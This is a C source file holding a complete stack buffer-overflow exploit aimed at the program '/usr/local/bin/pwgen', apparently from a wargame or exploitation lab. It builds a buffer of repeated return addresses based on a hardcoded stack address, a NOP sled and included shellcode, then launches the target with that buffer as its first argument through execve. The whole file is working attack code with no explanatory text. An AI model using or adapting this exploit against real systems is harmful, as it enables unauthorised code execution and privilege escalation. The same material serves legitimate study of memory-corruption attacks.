#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#include </share/shellcode.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE               644

#define ALIGNMENT_OFFSET                  1

#define BUFFER_SIZE                       644
#define NOP                               0x90

#define TARGET                            "/usr/local/bin/pwgen"

unsigned long get_sp(void) {
    return 0xFFBFD7B8;
}

int main(int argc, char *argv[]) {

    char *buff, *ptr;
    long *addr_ptr, addr;
    int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
    int i;
    char *args[3];
    char *env[1];

    if (argc > 1) bsize  = atoi(argv[1]);
    if (argc > 2) offset = atoi(argv[2]);

    if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
    }

    addr = get_sp() - offset;
    //printf("Using address: 0x%x\n", addr);

    ptr = buff;
    addr_ptr = (long *) (ptr + ALIGNMENT_OFFSET);
    for (i = 0; i < bsize; i+=4)
        *(addr_ptr++) = addr;

    
    
    for (i = 0; i < bsize/2; i++)
        buff[i] = NOP;
    

    ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];
        

    buff[bsize - 1] = '\0';

    
    args[0] = buff;

    args[1] = "-h";

    args[2] = NULL;

    env[0] = NULL;

    //printf("Usage: %s",buff);

    return execve(TARGET, args, env);

    //return 0;
}
